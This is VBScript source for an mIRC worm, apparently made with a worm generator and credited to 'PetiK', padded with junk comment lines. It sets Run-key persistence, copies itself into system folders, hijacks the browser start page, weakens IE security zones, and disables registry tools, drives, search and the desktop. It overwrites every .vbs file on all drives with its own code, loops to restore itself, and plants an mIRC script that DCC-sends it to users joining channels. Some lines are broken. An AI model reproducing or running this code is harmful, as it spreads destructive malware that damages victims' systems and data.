'~EMM
'~by PetiK
'~Generated with Sucke.mirc.worm.generator [SMWG] by sevenC / N0:7
'~ 11 /  1 /  2022

On Error Resume Next
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
Dim sucke, Fso, Drives, Drive, Folder, Files, File, Subfolders,Subfolder 
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
Set sucke = wscript.CreateObject("WScript.Shell")
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
Set fso = CreateObject("scripting.FileSystemObject")
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
Set Drives=fso.drives
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
Set dropper = Fso.opentextfile(wscript.scriptfullname, 1)
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
src = dropper.readall
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
set Trange = document.body.CreateTextRange
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
sucke.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Win32", "C:\Program Files\Internet Explorer\PLUGINS\Command32.exe.vbs"
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
sucke.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "sevenc.vze.com"
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
sucke.RegWrite "HKLM\Software\Microsoft\Internet Explorer\Main\Start Page", "sectors.vze.com"
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
sucke.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
sucke.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner", "PetiK"
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
sucke.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Shell32", "C:\Windows\Shell32.vbs"
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
Fso.copyfile wscript.scriptfullname, "C:\Program Files\Internet Explorer\PLUGINS\Command32.exe.vbs"
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
Fso.copyfile wscript.scriptfullname, "C:\windows\Shell32.vbs"
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
sucke.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop", 1, "REG_DWORD"
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
sucke.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)

'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
sucke.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\Disabled", 1, "REG_DWORD"
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
sucke.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", 1, "REG_DWORD"
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
sucke.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFind", 1, "REG_DWORD"
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
sucke.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoDiskCpl", 1, "REG_DWORD"
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
sucke.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose", 1, "REG_DWORD"
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
If sucke.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\sucke\sevenC") <> 1 then
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
ABCDE ""
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
End if
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
if day(now) = 1 and month(now) = 19 then
msgbox "Hellooo... PetiK is watching You !!",vbinformation,"sucke"
end if
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)

'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
Set Fso = createobject("scripting.filesystemobject")
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
Set Drives=fso.drives 
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
For Each Drive in Drives
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
If drive.isready then
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
Dosearch drive & "\"
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
end If 
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
Next 
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)

'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
Function Dosearch(Path)
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
on error resume next
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
Set Folder=fso.getfolder(path)
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
Set Files = folder.files 
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
For Each File in files
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
If fso.GetExtensionName(file.path)="vbs" then
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
on error resume next
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
Set dropper = Fso.createtextfile(file.path, True)
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
dropper.write src
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
dropper.Close
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
end if
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
If file.name = "mirc.ini" then
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
on error resume next
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
ABCDE(file.ParentFolder)
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
End If
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
next
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
Set Subfolders = folder.SubFolders 
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
For Each Subfolder in Subfolders 
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
Dosearch Subfolder.path 
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
Next 
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
end function 
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)

'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
Set NS41C186= fso.opentextfile(wscript.scriptfullname)
VB40GR94 = NS41C186.readall
NS41C186.close
Do
if not(fso.fileexists(wscript.scriptfullname)) then
set R8C5735O= fso.createtextfile(wscript.scriptfullname)
R8C5735O.write VB40GR94
R8C5735O.close
end if
RRS2K3AR = sucke.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Win32")
If RRS2K3AR <> "C:\Program Files\Internet Explorer\PLUGINS\Command32.exe.vbs" then
sucke.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Win32", "C:\Program Files\Internet Explorer\PLUGINS\Command32.exe.vbs"
end if
RRS2K3AR = ""
loop
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)

'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
function ABCDE(QR2T8452)
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
on error resume next
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
If QR2T8452 <> "" Then
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
J574I3N1 = sucke.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
If fso.fileexists("c:\mirc\mirc.ini") Then
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
QR2T8452 = "c:\mirc"
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
ElseIf fso.fileexists("c:\mirc32\mirc.ini") Then
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
QR2T8452 = "c:\mirc32"
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
ElseIf fso.fileexists(J574I3N1 & "\mirc\mirc.ini") Then
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
QR2T8452 = J574I3N1 & "\mirc"
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
ElseIf fso.fileexists(J574I3N1 & "\mirc32\mirc.ini") Then
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
QR2T8452 = J574I3N1 & "\mirc"
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
Else
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
QR2T8452 = ""
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
End If
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
End If
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
If QR2T8452 <> "" Then
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
Set N3EGB01V = UT8452J7.CreateTextFile(QR2T8452 & "\script.ini", True)
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
N3EGB01V = "[script]" & vbCrLf & "n0=on 1:JOIN:#:{"
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
N3EGB01V = N3EGB01V & vbCrLf & "n0=on 1:JOIN:#:{"
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
N3EGB01V = N3EGB01V & vbCrLf & "n1=  /if ( $nick == $me ) { halt }"
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
N3EGB01V = N3EGB01V & vbCrLf & "n2=  /." & Chr(100) & Chr(99) & Chr(99) & " send $nick "
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
N3EGB01V = N3EGB01V & "C:\Program Files\Internet Explorer\PLUGINS\Command32.exe.vbs"
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
N3EGB01V = N3EGB01V & vbCrLf & "n3=}"
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
script.Close
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
End If
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
End Function
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)

'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)

'~EMM by PetiK
'~Generated with Sucke.mirc.worm.generator [SMWG] by sevenC / N0:7
'~ 11 /  1 /  2022
